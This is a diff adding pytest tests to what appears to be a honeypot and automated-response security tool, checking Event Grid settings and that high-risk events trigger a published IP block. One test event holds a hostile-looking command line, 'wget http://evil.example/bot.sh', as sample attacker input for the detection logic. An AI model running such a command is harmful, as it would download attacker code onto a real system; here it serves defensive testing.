@@ -121,6 +121,56 @@ def test_load_settings_runs_cross_field_validation(tmp_path) -> None:
         load_settings(config_path, env_path)
 
 
+def test_eventgrid_settings_from_env(monkeypatch, tmp_path) -> None:
+    monkeypatch.setenv("EVENTGRID_ENABLED", "true")
+    monkeypatch.setenv("EVENTGRID_TOPIC_ENDPOINT", "https://topic.example.com/api/events")
+    monkeypatch.setenv("EVENTGRID_TOPIC_KEY", "unit-key")
+    env_path = tmp_path / "env"
+    env_path.write_text("", encoding="utf-8")
+    settings = load_settings(
+        "src/cloudsentinel/configs/usas-production.yaml",
+        env_path,
+    )
+    assert settings.soar.eventgrid_enabled is True
+    assert settings.soar.eventgrid_topic_endpoint == "https://topic.example.com/api/events"
+    assert settings.soar.eventgrid_topic_key.get_secret_value() == "unit-key"
+
+
+@pytest.mark.asyncio
+async def test_soar_publishes_block_to_eventgrid(monkeypatch) -> None:
+    calls: list[dict] = []
+
+    async def fake_publish(**kwargs):
+        calls.append(kwargs)
+        return True, ""
+
+    monkeypatch.setattr("cloudsentinel.soar.publish_block", fake_publish)
+    from cloudsentinel.soar import SOAREngine
+
+    engine = SOAREngine(
+        risk_threshold=30,
+        firewall_enabled=True,
+        firewall_dry_run=False,
+        allowlist=["127.0.0.1"],
+        eventgrid_enabled=True,
+        eventgrid_endpoint="https://topic.example.com/api/events",
+        eventgrid_key="unit-key",
+    )
+    event = {
+        "eventid": "cloudsentinel.command.input",
+        "src_ip": "8.8.8.8",
+        "session": "s1",
+        "input": "wget http://evil.example/bot.sh",
+        "cloudsentinel_risk_score": 100,
+    }
+    result = await engine.process_event("s1", event)
+    assert result["cloudsentinel_soar_action"] == "eventgrid_published"
+    assert calls
+    assert calls[0]["ip"] == "8.8.8.8"
+    assert calls[0]["endpoint"] == "https://topic.example.com/api/events"
+    assert calls[0]["key"] == "unit-key"
+
+
 def test_vault_reads_kv_v2_path(monkeypatch) -> None:
     monkeypatch.setenv("VAULT_ADDR", "http://vault")
     monkeypatch.setenv("VAULT_TOKEN", "token")
